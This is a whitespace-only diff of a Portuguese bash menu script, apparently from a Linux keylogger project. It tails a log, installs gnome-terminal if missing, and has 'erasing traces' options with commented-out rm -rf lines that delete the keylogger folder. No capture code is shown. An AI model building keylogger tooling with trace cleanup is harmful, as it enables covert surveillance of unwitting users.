@@ -51,10 +51,10 @@ case "$resposta" in
         	if pgrep gnome-terminal > /dev/null 
 		    then
 			    gnome-terminal -x bash -c "tail -f $log; exec $SHELL";
-		    else
+		else
 		    	apt-get install gnome-terminal -y
 	        	gnome-terminal -x bash -c "tail -f $log; exec $SHELL";
-		    fi
+		fi
 	    sleep 1
 	    clear
 	;;
@@ -83,7 +83,7 @@ case "$resposta" in
 		        sleep 1
 		        echo " -> APAGANDO RASTROS"
 		        sleep 1
-			    if [ -f "$arquivo1" ]; then
+			if [ -f "$arquivo1" ]; then
 				    echo -e " -> APAGANDO PASTA $arquivo1"
 #			        cd ..
 #	   	    	        rm -rf keyloggerlinux/
@@ -105,7 +105,7 @@ case "$resposta" in
             cd ..
             echo -e " -> SAINDO DO SISTEMA"
             sleep 1
-	            if [ -f "$arquivo1" ]; then
+	        if [ -f "$arquivo1" ]; then
         	        echo -e " -> APAGANDO $arquivo1"
 #		            cd ..
 #                   rm -rf keyloggerlinux/
@@ -113,7 +113,7 @@ case "$resposta" in
        	        else
         	        echo -e " -> PASTA $arquivo1 JÁ APAGADA!"
                     sleep 1
-	            fi
+	        fi
             echo -e " -> SISTEMA FINALIZADO."
             exit
 	    ;;
